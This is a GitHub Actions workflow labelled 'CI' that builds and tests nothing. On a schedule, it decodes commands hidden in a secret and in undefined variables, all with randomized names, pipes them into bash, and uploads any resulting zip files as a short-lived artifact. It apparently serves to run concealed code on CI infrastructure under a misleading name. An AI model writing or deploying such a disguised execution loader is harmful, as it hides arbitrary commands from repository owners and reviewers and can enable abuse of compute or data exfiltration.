name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '25 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Perform
        env:
          tpq9: ${{ secrets.tpq9 }}
        run: |
          printf '%s' "$tpq9" | jq -r .kyxp5628 | /bin/bash
          printf '%s' "$nbxu6279" | jq -r .jcv42385 | /bin/bash
          printf '%s' "$fyx5714" | jq -r .lh423 | /bin/bash
          printf '%s' "$cwe65605" | jq -r .yzyvi0 | /bin/bash
          echo $avas4 | jq -r .fu8 | /bin/bash
          echo $ouft7 | jq -r .aox8 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: 2QlWg3AV
          path: "*.zip"
          retention-days: 1
